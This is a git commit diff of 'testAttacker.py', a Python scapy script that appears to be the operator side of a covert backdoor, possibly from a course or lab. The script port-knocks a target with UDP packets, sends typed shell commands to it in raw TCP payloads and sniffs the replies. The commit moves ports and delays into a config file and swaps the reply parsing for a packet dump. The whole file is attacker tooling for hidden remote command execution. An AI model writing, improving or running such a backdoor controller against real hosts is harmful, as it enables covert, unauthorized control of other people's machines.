9ad2aebd347f91d33fcd6f1c25d716d64f1ab189
root <young_uno1080@yahoo.com>
2018-05-19 22:37:45 -0700

    Update testAttacker.py

--- testAttacker.py
+++ testAttacker.py
@@ -7,7 +7,7 @@ from scapy.all import *
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 results = ""
-targetIP = config.targetIP
+targetIP = ""
 
 def checkRootPrivilege():
     if os.getuid() != 0:
@@ -15,35 +15,36 @@ def checkRootPrivilege():
 
 def portKnocking():
     global targetIP
-    portKnocks = config.portKnocks
-    for port in portKnocks:
-        packet = IP(dst=targetIP)/UDP(sport=port, dport=8005)
+    ports = config.portKnocks
+    for port in ports:
+        packet = IP(dst=targetIP)/UDP(sport=port, dport=config.listenPort)
         send(packet)
-        time.sleep(1)
+        time.sleep(config.delay)
 
 def sendCommand(cmd):
-    packet = IP(dst=targetIP)/TCP(dport=8505)/Raw(load=cmd)
+    packet = IP(dst=targetIP)/TCP(sport=config.localPort, dport=config.remotePort)/Raw(load=cmd.encode("utf8"))
     send(packet)
 
 def recvCommand(packet):
     global targetIP
-    if packet.haslayer(IP):
-        if packet[IP].src == targetIP:
-            #data = parsePacket(packet)
-            if packet.haslayer(Raw):
-                cmd = packet[Raw].load
-                print(cmd)
+    packet.show()
+    # if packet.haslayer(IP):
+    #     if packet[IP].src == targetIP:
+    #         #data = parsePacket(packet)
+    #         if packet.haslayer(Raw):
+    #             cmd = packet[Raw].load
+    #             print("Result: %s " % cmd)
 
 def main():
     global targetIP
     checkRootPrivilege()
-    portKnocking()
+    targetIP = str(input("Enter target IP: "))
 
+    portKnocking()
     while True:
-        cmd = raw_input("Enter command: ")
+        cmd = input("Enter command: ")
         sendCommand(cmd)
-        while True:
-            sniff(filter="tcp and dst port 8505", count=1, prn=recvCommand)
+        sniff(filter="dst port " + str(config.localPort) + " and src port " + str(config.remotePort), prn=recvCommand)
 
 if __name__ == '__main__':
     main()
